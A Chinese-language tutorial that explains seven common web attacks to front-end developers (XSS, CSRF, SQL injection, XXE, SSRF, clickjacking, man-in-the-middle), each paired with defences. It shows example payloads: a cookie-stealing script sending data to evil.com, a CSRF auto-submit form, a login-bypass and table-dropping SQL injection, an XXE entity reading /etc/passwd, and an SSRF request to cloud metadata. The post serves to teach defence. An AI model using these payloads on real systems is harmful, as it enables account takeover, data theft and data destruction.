# 前端开发必知的常见网络安全攻击

> 安全不是后端的事，前端写的每一行代码都可能成为攻击入口。这篇文章用大白话讲清楚七种最常见的攻击，每种都配上生活化的比喻，让你真正理解"为什么这样会被攻击"。

---

## 一、XSS（跨站脚本攻击）

### 用一句话理解

**你的网站帮攻击者播放了他写的"广告"，而且这广告能偷你用户的钱包。**

### 生活比喻

你开了一家公告栏，任何人都可以贴纸条。有个坏人贴了一张纸条，上面写着"扫码领红包"，但二维码其实是钓鱼链接。你的公告栏把这张纸条展示给了所有来访的人，坏人的"广告"就通过你的公告栏传播出去了。

### 攻击原理

攻击者把恶意 JavaScript 代码注入到网页内容里，当其他用户浏览这个页面时，代码在他们的浏览器里执行。

**三种类型：**

| 类型 | 特点 | 举例 |
|------|------|------|
| 存储型 XSS | 恶意代码存进数据库，每次访问都触发 | 评论区注入脚本 |
| 反射型 XSS | 恶意代码在 URL 里，点击链接触发 | 搜索框参数注入 |
| DOM 型 XSS | 前端 JS 直接把不安全内容写入 DOM | innerHTML 注入 |

**攻击示例：**

用户在评论框输入了这个：
```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

如果你的网站直接把这段内容渲染到页面上，所有看到这条评论的用户的 Cookie 就被偷走了。

**前端常见的危险写法：**
```js
// 危险！直接把用户输入塞进 innerHTML
element.innerHTML = userInput

// 危险！eval 执行用户输入
eval(userInput)

// 危险！直接拼接 URL 参数到页面
document.write(location.search)
```

**防御方案：**
```js
// 安全：用 textContent 而不是 innerHTML
element.textContent = userInput

// 安全：用 DOMPurify 净化 HTML（需要展示富文本时）
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userInput)
```

服务端设置 CSP 响应头，限制脚本来源：
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

## 二、CSRF（跨站请求伪造）

### 用一句话理解

**攻击者借你的手，用你的身份，在你不知情的情况下做了一件事。**

### 生活比喻

你登录了银行网站，然后去逛论坛。论坛里有一张图片，图片地址是 `https://bank.com/transfer?to=hacker&amount=10000`。你的浏览器加载这张"图片"时，实际上向银行发了一个转账请求，而且带着你的登录 Cookie，银行以为是你本人操作的。

### 攻击原理

浏览器在发请求时会自动带上目标域名的 Cookie。攻击者构造一个请求，诱导已登录的用户触发，服务器无法区分这是用户主动操作还是被诱导的。

**攻击示例：**

攻击者在自己的网站放了这段代码：
```html
<!-- 用户访问攻击者网站时，自动发起转账请求 -->
<img src="https://yourbank.com/transfer?to=hacker&amount=10000" style="display:none">

<!-- 或者自动提交表单 -->
<form action="https://yourbank.com/transfer" method="POST" id="f">
  <input name="to" value="hacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>
```

**防御方案：**

1. **CSRF Token**（最常用）：服务端生成随机 token，每次请求必须带上，攻击者拿不到这个 token。

```js
// 前端请求时带上 token
axios.defaults.headers.common['X-CSRF-Token'] = getCsrfToken()
```

2. **SameSite Cookie**：设置 Cookie 的 SameSite 属性，跨站请求不带 Cookie。

```
Set-Cookie: session=xxx; SameSite=Strict; HttpOnly; Secure
```

3. **验证 Referer/Origin 请求头**：检查请求来源是否是自己的域名。

## 三、SQL 注入

### 用一句话理解

**攻击者在你的搜索框里写了一段"数据库命令"，你的服务器真的执行了它。**

### 生活比喻

你开了一家图书馆，管理员根据读者报的书名去书架找书。有个坏人说："我要借《哈利波特》，顺便把所有书的借阅记录都给我看一遍。"管理员没有辨别能力，真的把所有记录都翻出来了。

### 攻击原理

后端直接把用户输入拼接进 SQL 语句，攻击者通过构造特殊输入改变 SQL 语义，实现查询任意数据、删除数据、绕过登录验证等操作。

**攻击示例：**

登录接口的 SQL 语句是这样拼的：
```js
// 危险！直接拼接用户输入
const sql = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`
```

攻击者在用户名输入框填入：`admin' --`

拼接后的 SQL 变成：
```sql
SELECT * FROM users WHERE username='admin' --' AND password='任意内容'
```

`--` 是 SQL 注释符，后面的密码验证被注释掉了，直接以 admin 身份登录成功。

更狠的：输入 `'; DROP TABLE users; --`，直接把用户表删掉。

**防御方案：**

```js
// 安全：使用参数化查询（预编译语句）
// Node.js + mysql2
const [rows] = await db.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]  // 参数单独传，不拼接
)

// Mongoose 天然安全，不存在 SQL 注入
// 但要注意 NoSQL 注入（MongoDB 的 $where 操作符）
```

> 这个攻击主要是后端问题，但前端要知道：**永远不要相信用户输入，所有输入都要在后端做校验和参数化处理。**

## 四、XXE（XML 外部实体注入）

### 用一句话理解

**攻击者在 XML 文件里写了一个"快捷方式"，指向服务器上的敏感文件，服务器解析时把文件内容读出来返回给攻击者。**

### 生活比喻

你让员工处理一批快递单，快递单是 XML 格式的。有个坏人在快递单里写了一条特殊指令："收件人地址 = 服务器上 /etc/passwd 文件的内容"。员工（服务器）老老实实地把这个文件内容填进去，坏人就拿到了服务器的用户列表。

### 攻击原理

XML 规范支持"外部实体"，可以引用外部文件或 URL。如果服务端解析 XML 时没有禁用这个功能，攻击者就能读取服务器本地文件，甚至发起内网请求。

**攻击示例：**

攻击者上传了这样一个 XML 文件：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

服务器解析时，`&xxe;` 会被替换成 `/etc/passwd` 的内容，然后返回给攻击者。

**防御方案：**

在服务端解析 XML 时禁用外部实体（DTD）：

```js
// Node.js 使用 libxmljs 时
const doc = libxmljs.parseXml(xmlContent, {
  noent: false,  // 禁用实体解析
  dtdload: false // 禁用 DTD 加载
})
```

> 上一篇讲 SVG 的文章里提到过，SVG 是 XML，所以 SVG 上传也有 XXE 风险，是同一个原理。

## 五、SSRF（服务器端请求伪造）

### 用一句话理解

**攻击者让你的服务器帮他去访问他自己访问不到的地方（比如你的内网）。**

### 生活比喻

你的公司有个功能：员工可以提交一个网址，系统会自动抓取那个网页的内容。有个坏人提交了 `http://192.168.1.1/admin`（公司内网路由器管理页面），系统帮他抓取了内容，他就拿到了内网设备的信息。

### 攻击原理

服务端有一个功能，会根据用户提供的 URL 发起请求（比如图片预览、网页截图、Webhook 回调等）。攻击者提供内网地址，让服务器帮他访问内网资源，绕过防火墙限制。

**攻击示例：**

你的网站有个"预览网页"功能：
```
POST /preview
{ "url": "https://example.com" }
```

攻击者提交：
```
{ "url": "http://169.254.169.254/latest/meta-data/" }
```

`169.254.169.254` 是 AWS 云服务器的元数据接口，只有服务器本身能访问。攻击者通过你的服务器拿到了云服务器的密钥信息。

**防御方案：**

```js
// 后端校验 URL，禁止访问内网地址
const { URL } = require('url')
const dns = require('dns').promises

async function isSafeUrl(urlStr) {
  const url = new URL(urlStr)

  // 只允许 http/https
  if (!['http:', 'https:'].includes(url.protocol)) return false

  // 解析 IP，检查是否是内网地址
  const addresses = await dns.resolve4(url.hostname)
  for (const ip of addresses) {
    if (isPrivateIp(ip)) return false  // 禁止内网 IP
  }

  return true
}
```

## 六、点击劫持（Clickjacking）

### 用一句话理解

**攻击者在你看到的按钮上面，透明地叠了一个真实的危险按钮，你以为点的是"领红包"，实际上点的是"确认转账"。**

### 生活比喻

你在街上看到一个"免费领礼品"的摊位，摊主让你在一张纸上签名。但纸下面压着一份合同，你的签名实际上签在了合同上。

### 攻击原理

攻击者用 `<iframe>` 把目标网站嵌入自己的页面，设置为透明（`opacity: 0`），然后在上面放一个诱导用户点击的按钮。用户点击时，实际上触发了 iframe 里目标网站的操作。

**攻击示例：**

```html
<!-- 攻击者的页面 -->
<div style="position: relative">
  <!-- 诱导按钮，用户看到的 -->
  <button style="position: absolute; z-index: 1">
    点击领取 100 元红包！
  </button>

  <!-- 真实的目标网站，透明叠在上面 -->
  <iframe
    src="https://yourbank.com/confirm-transfer"
    style="opacity: 0; position: absolute; z-index: 2; width: 200px; height: 50px"
  ></iframe>
</div>
```

**防御方案：**

服务端设置响应头，禁止自己的页面被 iframe 嵌入：

```
X-Frame-Options: DENY
```

或者用 CSP：
```
Content-Security-Policy: frame-ancestors 'none'
```

## 七、中间人攻击（MITM）

### 用一句话理解

**你以为在和银行说话，其实中间有个人在偷听，甚至在篡改你们说的内容。**

### 生活比喻

你给朋友写信，快递员偷偷拆开信看了，还把里面的内容改了，再重新封好寄出去。你和朋友都不知道信被动过手脚。

### 攻击原理

在用户和服务器之间，攻击者插入自己作为"中间人"，可以监听所有通信内容，甚至篡改请求和响应。常见于公共 WiFi 环境。

**常见场景：**
- 咖啡厅 WiFi 被攻击者控制
- HTTP 明文传输被监听
- DNS 被污染，域名解析到攻击者服务器

**防御方案：**

1. **全站 HTTPS**：加密传输，中间人看不到内容
2. **HSTS 响应头**：强制浏览器只用 HTTPS 访问
   ```
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   ```
3. **证书固定（Certificate Pinning）**：移动端 App 验证服务器证书指纹
4. **用户侧**：不要在公共 WiFi 下操作敏感业务

## 八、快速记忆总结

| 攻击名称 | 一句话记忆 | 核心防御 |
|---------|-----------|---------|
| XSS | 网站帮攻击者播放恶意脚本 | 转义输出 + CSP |
| CSRF | 借你的身份偷偷操作 | CSRF Token + SameSite Cookie |
| SQL 注入 | 在输入框写数据库命令 | 参数化查询 |
| XXE | XML 里藏"读文件"指令 | 禁用外部实体 |
| SSRF | 让服务器帮你访问内网 | 校验 URL + 禁止内网地址 |
| 点击劫持 | 透明 iframe 骗你点错按钮 | X-Frame-Options |
| 中间人 | 偷听并篡改通信内容 | HTTPS + HSTS |

## 九、前端开发的安全习惯清单

养成这些习惯，能挡住大部分攻击：

**输入处理：**
- 永远不信任用户输入，前端校验只是提示，后端必须再校验一遍
- 展示用户内容时用 `textContent`，不用 `innerHTML`
- 需要展示富文本时，用 DOMPurify 净化

**Cookie 和 Token：**
- 敏感 Cookie 设置 `HttpOnly`（JS 读不到）、`Secure`（只走 HTTPS）、`SameSite=Strict`
- Token 存 `HttpOnly Cookie`，不要存 `localStorage`（XSS 可以读到）

**请求安全：**
- 所有修改操作（POST/PUT/DELETE）加 CSRF Token
- 不要在 URL 里传敏感信息（会被日志记录）

**页面安全：**
- 设置 `X-Frame-Options: DENY` 防点击劫持
- 设置 CSP 响应头限制脚本来源
- 全站 HTTPS，设置 HSTS

**依赖安全：**
- 定期 `npm audit` 检查依赖漏洞
- 不要随意引入来路不明的第三方脚本
